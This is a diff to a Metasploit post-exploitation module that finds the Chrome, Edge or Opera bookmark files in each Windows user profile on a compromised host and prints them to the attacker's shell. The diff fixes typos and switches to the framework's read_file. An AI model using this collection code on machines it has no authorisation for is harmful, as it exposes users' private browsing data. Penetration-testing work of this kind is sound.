@@ -1,3 +1,4 @@
+
 class MetasploitModule < Msf::Post
     include Msf::Post::File
     include Msf::Post::Windows::UserProfiles
@@ -35,9 +36,11 @@ class MetasploitModule < Msf::Post
         
         #If the browser is Google Chrome or Edge is searches the "AppData\Local directory, if it is Opera, it searches the AppData\Roaming directory"
 
-
+        
         if (browser == "GoogleChrome")
+        
           next unless user['LocalAppData']
+        
           bookmark_path = user['LocalAppData'] + "\\Google\\Chrome\\User Data\\Default\\Bookmarks" #sets path for Google Chrome Bookmarks
           puts "Google Chrome Google Chrome Google Chrome"
           puts "Google Chrome Google Chrome Google Chrome"
@@ -66,22 +69,19 @@ class MetasploitModule < Msf::Post
 
         end
         
-        next unless file?(bookmark_path) #if file exist it is set to found, then all the bookmarks are outputted to standard output (the shell)
+        next unless file?(bookmark_path) #if file exists it is set to found, then all the bookmarks are outputted to standard output (the shell)
 
           fileexists = true
           puts "BOOKMARKS FOR " + user['ProfileDir']
           puts "\n"
-          file = File.open(bookmark_path)
+          file = read_file(bookmark_path)
     
-          File.foreach(bookmark_path) { |line| puts line }
-    
-          file.close
-      
+          puts file
 
       end
 
       if (fileexists == false) # if file was not found, prints no file found.
-        puts "No Bookmarks found for " + broswer
+        puts "No Bookmarks found for " + browser
       
       end
 
